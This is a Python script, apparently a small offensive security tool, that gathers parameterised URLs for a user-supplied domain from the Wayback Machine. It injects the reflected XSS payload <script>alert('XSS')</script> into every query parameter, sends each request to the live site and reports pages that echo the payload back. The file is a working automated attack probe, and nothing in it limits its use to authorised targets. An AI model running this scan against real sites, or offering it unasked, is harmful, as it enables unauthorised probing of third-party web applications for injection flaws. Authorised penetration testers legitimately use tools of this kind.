import requests
import urllib.parse
from time import sleep

print("========================================")
print("  Reflected XSS Scanner using Wayback Machine  ")
print("========================================")

# 🏁 Set target domain
target = input("Enter the target domain : ")
# 🧪 Payload for reflected XSS test
xss_payload = "<script>alert('XSS')</script>"

# 🌍 Fetch URLs from Wayback Machine
print("[+] Fetching URLs from Wayback Machine...")
wayback_url = f"http://web.archive.org/cdx/search/cdx?url={target}/*&output=text&fl=original&collapse=urlkey"
urls = requests.get(wayback_url).text.splitlines()

# 🎯 Filter URLs with parameters (i.e., contain '?')
urls_with_params = [url for url in urls if "?" in url]

print(f"[+] Found {len(urls_with_params)} URLs with parameters to test.")

# 🚀 Test each URL for reflected XSS
for url in urls_with_params:
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)

    # Rebuild URL with XSS payload in every param
    new_query = {k: xss_payload for k in query}
    encoded_query = urllib.parse.urlencode(new_query, doseq=True)
    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{encoded_query}"

    try:
        print(f"[*] Testing {test_url}")
        response = requests.get(test_url, timeout=10)

        # 🕵️ Look for payload in response
        if xss_payload in response.text:
            print(f"[!] Possible XSS at: {test_url}")
    except Exception as e:
        print(f"[x] Error testing {test_url}: {e}")

    sleep(1)  # To avoid rate-limiting
